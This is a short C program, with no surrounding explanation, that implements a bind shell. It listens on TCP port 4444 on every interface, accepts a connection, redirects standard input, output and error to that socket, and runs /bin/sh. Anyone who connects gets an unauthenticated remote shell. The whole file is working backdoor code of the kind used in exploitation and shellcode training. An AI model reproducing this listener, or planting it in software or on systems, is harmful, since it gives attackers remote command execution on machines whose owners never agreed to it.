#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 

#define PORT 4444


int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 



struct sockaddr_in hostaddr;            // server aka listen address

int main() 
{ 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    hostaddr.sin_family = AF_INET;     //tcp
    hostaddr.sin_port = htons(PORT);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  

    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    listen(host_sockid, 2); 

     
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    
    close(host_sockid); 

    return 0; 
}

